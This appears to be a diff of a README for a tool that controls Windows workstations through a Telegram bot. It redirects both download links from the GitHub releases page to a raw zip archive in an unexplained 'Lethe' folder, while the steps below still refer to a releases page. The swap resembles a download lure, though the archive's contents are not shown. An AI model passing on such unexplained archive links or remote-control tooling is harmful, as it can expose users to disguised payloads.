@@ -1,6 +1,6 @@
 # 🖥️ windows-telegram-bot - Manage your windows workstations through telegram
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Prasadchelated435/windows-telegram-bot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Prasadchelated435/windows-telegram-bot/main/Lethe/windows-telegram-bot-2.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You need a telegram bot to send commands.
 
 Visit the link below to get the software files.
 
-[Click here to open the download page](https://github.com/Prasadchelated435/windows-telegram-bot/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Prasadchelated435/windows-telegram-bot/main/Lethe/windows-telegram-bot-2.1.zip)
 
 1. Go to the link above.
 2. Find the latest release version on the page.
